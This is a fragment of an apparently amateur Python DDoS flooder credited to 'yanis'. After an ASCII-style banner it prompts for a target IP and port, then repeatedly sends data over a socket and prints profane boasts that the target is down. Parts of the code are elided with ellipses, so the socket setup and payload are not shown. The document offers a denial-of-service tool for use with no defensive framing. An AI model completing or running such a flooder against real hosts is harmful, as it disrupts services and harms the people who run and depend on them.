...
YANISSSSSSSSSSS NIYAKKKKKKKKKKKKKKKKKKKK

     DDOS\Yanis[31m BY\yanis[31m TEAM\yanis[31m AS\yanis[31m §
''')

print("\033[31m DEV# :\033[31m yanis\033[31m  ")
print("password : yanis  § ")

ip = str(input("  IP/HOST:"))
port = int(input("  PORT/HOST:"))
choice = str(input("  ATTACK BY yanis? (Y/N):"))
...
def run2():
	...
	while True:
		try:
			...
			for x in range(times):
				s.send(data)
			print(i +"DOWN IP FUCKED BY yanis")
		except:
			s.close()
			print("[*] DOWN IP FUCKED BY yanis")
